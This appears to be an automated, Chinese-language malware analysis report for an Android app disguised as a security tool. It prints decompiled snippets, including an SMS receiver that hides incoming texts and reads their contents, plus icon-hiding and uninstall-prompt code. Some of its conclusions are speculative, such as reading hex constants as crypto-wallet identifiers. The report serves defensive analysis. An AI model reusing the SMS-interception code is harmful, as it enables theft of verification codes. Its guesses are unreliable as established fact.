@@ -1,0 +1,161 @@
+{
+  "APK信息": {
+    "文件名": "2546b4d418e49a51df144b848ecf42abddaece7fd145e760a8ba8eac93446321.apk",
+    "sha256": "2546b4d418e49a51df144b848ecf42abddaece7fd145e760a8ba8eac93446321",
+    "包名": "com.clean.antivirus.security",
+    "应用名": "Dr. Security",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 690.3
+  },
+  "行为列表": [
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "sms_intercept",
+          "中文名": "短信拦截",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "abortBroadcast"
+            ]
+          }
+        },
+        {
+          "子行为": "wap_billing",
+          "中文名": "WAP计费",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "wap"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\dr\\avl\\receiver\\MessageReceiver;",
+          "method_signature": "if(intent.getAction()",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "if (intent.getAction().equalsIgnoreCase(\"android.provider.Telephony.SMS_RECEIVED\")) {\n    abortBroadcast();\n    Bundle extras = intent.getExtras();\n    if (extras != null) {\n        Object[] objArr = (Object[]) extras.get(\"pdus\");\n        SmsMessage[] smsMessageArr = new SmsMessage[objArr.length];\n        for (int i = 0; i < objArr.length; i++) {\n            smsMessageArr[i] = SmsMessage.createFromPdu((byte[]) objArr[i]);\n        }\n        for (SmsMessage smsMessage : smsMessageArr) {\n            smsMessage.getDisplayOriginatingAddress();\n        }\n    }\n}",
+          "malicious_code_snippet_context": "  \n      @Override // android.content.BroadcastReceiver\n      public void onReceive(Context context, Intent intent) {\n>>>         if (intent.getAction().equalsIgnoreCase(\"android.provider.Telephony.SMS_RECEIVED\")) {\n>>>             abortBroadcast();\n>>>             new StringBuilder();\n>>>             Bundle extras = intent.getExtras();\n>>>             if (extras != null) {\n>>>                 Object[] objArr = (Object[]) extras.get(\"pdus\");\n>>>                 SmsMessage[] smsMessageArr = new SmsMessage[objArr.length];\n>>>                 for (int i = 0; i < objArr.length; i++) {\n>>>                     smsMessageArr[i] = SmsMessage.createFromPdu((byte[]) objArr[i]);\n>>>                 }\n>>>                 for (SmsMessage smsMessage : smsMessageArr) {\n>>>                     smsMessage.getDisplayOriginatingAddress();\n>>>                     smsMessage.getMessageBody();\n>>>                     this.f1038a.format(new Date(smsMessage.getTimestampMillis()));\n                  }\n              }\n          }",
+          "behavior_description": "该 BroadcastReceiver 监听 SMS_RECEIVED 广播，收到短信后立即调用 abortBroadcast() 终止广播继续传递，导致系统默认短信应用和其他应用无法收到该短信，从而对用户隐藏短信内容。随后从 Intent extras 中提取 PDU 数据并解析为 SmsMessage 对象，读取发送方地址和短信内容。数据流向：SMS_RECEIVED Intent（source：incoming SMS PDU）→ abortBroadcast()（sink：终止广播隐藏短信）+ getDisplayOriginatingAddress()（sink：提取发送方号码）。此行为可被用于拦截银行验证码、C2指令短信或订阅确认短信，造成用户经济损失和隐私泄露。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "silent_install_uninstall",
+      "中文名": "静默安装/卸载",
+      "MITRE": "",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "silent_uninstall",
+          "中文名": "静默卸载",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.DELETE_PACKAGES"
+            ],
+            "字符串": [
+              "android.intent.action.DELETE"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\anti\\security\\view\\NewInstallPopView;",
+          "method_signature": "onClick(View view)",
+          "malicious_behavior": "silent_install_uninstall",
+          "behavior_type": "grayware",
+          "risk_level": "低",
+          "malicious_code_snippet": "Intent intent = new Intent(\"android.intent.action.DELETE\", Uri.parse(\"package:\" + NewInstallPopView.this.b.getPackageName()));\nintent.addFlags(268435456);\nNewInstallPopView.this.d.startActivity(intent);",
+          "malicious_code_snippet_context": "              public void onClick(View view) {\n                  NewInstallPopView.this.d();\n                  ((NotificationManager) NewInstallPopView.this.d.getSystemService(\"notification\")).cancel(NewInstallPopView.this.c);\n>>>                 Intent intent = new Intent(\"android.intent.action.DELETE\", Uri.parse(\"package:\" + NewInstallPopView.this.b.getPackageName()));\n>>>                 intent.addFlags(268435456);\n>>>                 NewInstallPopView.this.d.startActivity(intent);\n                  dse.b(arc.a(Integer.valueOf(NewInstallPopView.this.c)), 0);\n              }\n          });",
+          "behavior_description": "代码通过构造 ACTION_DELETE Intent，指定目标包名为 NewInstallPopView.this.b.getPackageName()，并添加 FLAG_ACTIVITY_NEW_TASK 标志后调用 startActivity 启动系统卸载界面。该代码位于自定义弹窗视图 NewInstallPopView 的按钮点击事件中，结合恶意样本背景，推测是通过伪装弹窗诱导用户点击确认卸载安全软件或其他目标应用，属于社会工程学诱导卸载行为。数据来源为 getPackageName() 获取的目标包名→危险操作为 startActivity(ACTION_DELETE) 触发卸载流程。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting",
+          "hideIcon"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lns\\agd;",
+          "method_signature": "if(!aeg.a()",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "if (!aeg.a().j() && dsk.b(context).isHideIcon()) {\n    String str = Build.BRAND;\n    String str2 = Build.MODEL;\n    if (!str.equalsIgnoreCase(\"ZTE\") || !str2.equalsIgnoreCase(\"N958St\")) {\n        if (!str.equalsIgnoreCase(\"Xiaomi\") || !str2.equalsIgnoreCase(\"MI 4LTE\")) {\n            if (!str.equalsIgnoreCase(\"google\") || !str2.equalsIgnoreCase(\"Nexus 6P\")) {\n                if (!str.equalsIgnoreCase(\"LGE\") || (!str2.equalsIgnoreCase(\"LG-H525n\") && !str2.equalsIgnoreCase(\"LG-D838\"))) {\n                    List<String> filterBrand = dsk.b(context).getFilterBrand();\n                    if (filterBrand != null) {",
+          "malicious_code_snippet_context": "      }\n  \n      public static void b(Context context) {\n>>>         if (!aeg.a().j() && dsk.b(context).isHideIcon()) {\n>>>             String str = Build.BRAND;\n>>>             ALog.d(\"PatterView\", 4, \"test logo doHideIcon brand:\" + str);\n>>>             String str2 = Build.MODEL;\n>>>             ALog.d(\"PatterView\", 4, \"test logo doHideIcon model:\" + str2);\n>>>             if (!str.equalsIgnoreCase(\"ZTE\") || !str2.equalsIgnoreCase(\"N958St\")) {\n>>>                 if (!str.equalsIgnoreCase(\"Xiaomi\") || !str2.equalsIgnoreCase(\"MI 4LTE\")) {\n>>>                     if (!str.equalsIgnoreCase(\"google\") || !str2.equalsIgnoreCase(\"Nexus 6P\")) {\n>>>                         if (!str.equalsIgnoreCase(\"LGE\") || (!str2.equalsIgnoreCase(\"LG-H525n\") && !str2.equalsIgnoreCase(\"LG-D838\"))) {\n                              List<String> filterBrand = dsk.b(context).getFilterBrand();\n                              if (filterBrand != null) {\n                                  Iterator<String> it = filterBrand.iterator();",
+          "behavior_description": "代码通过检查配置项 isHideIcon() 判断是否需要隐藏应用图标，并读取设备品牌和型号作为数据来源，用于过滤特定不兼容设备，随后获取过滤品牌列表以准备执行后续的图标隐藏逻辑。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "crypto_wallet_detection",
+      "中文名": "加密钱包地址采集",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "3447CA69ECC65C251FF41241E62BBD39",
+          "15EB31CED2D9A8EFA2B2C924798273E3",
+          "151D281A624318CDE9DCAAD88E8BB381"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lns\\dgf;",
+          "method_signature": "?(?)",
+          "malicious_behavior": "crypto_wallet_detection",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "public static final dzp s = new dzp(\"3447CA69ECC65C251FF41241E62BBD39\", (byte) 11, 19, dgn.a());",
+          "malicious_code_snippet_context": "      public static final dzp p = new dzp(\"DAB0432BB529DC1F76C440777C86D232\", (byte) 11, 16, dgn.a());\n      public static final dzp q = new dzp(\"14A948537488C8020631E254C453125F\", (byte) 11, 17, dgn.a());\n      public static final dzp r = new dzp(\"BB30A9CAF941935593088670DDBB2E8F\", (byte) 11, 18, dgn.a());\n>>>     public static final dzp s = new dzp(\"3447CA69ECC65C251FF41241E62BBD39\", (byte) 11, 19, dgn.a());\n      public static final dzp t = new dzp(\"151D281A624318CDE9DCAAD88E8BB381\", (byte) 11, 20, dgn.a());\n      public static final dzp u = new dzp(\"0D59D4C57326F8B1A562646845F9A364\", (byte) 11, 21, dgn.a());\n      public static final dzp v = new dzp(\"844F6BC9665F82CC489D3859E1101898\", (byte) 11, 22, dgn.a());",
+          "behavior_description": "该类定义了大量静态常量字段（i至C），每个字段使用一个32位十六进制字符串标识符初始化dzp对象。这些十六进制字符串极可能是加密/混淆后的加密货币钱包应用包名、钱包地址正则模式或钱包相关文件路径的标识符。恶意软件通过这些预定义的标识符在设备上扫描和检测已安装的加密钱包应用或存储的钱包地址，为后续窃取加密资产做准备。数据流向为：设备已安装应用列表/文件系统(source)→基于这些常量进行匹配检测(sink)。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.7-plus",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
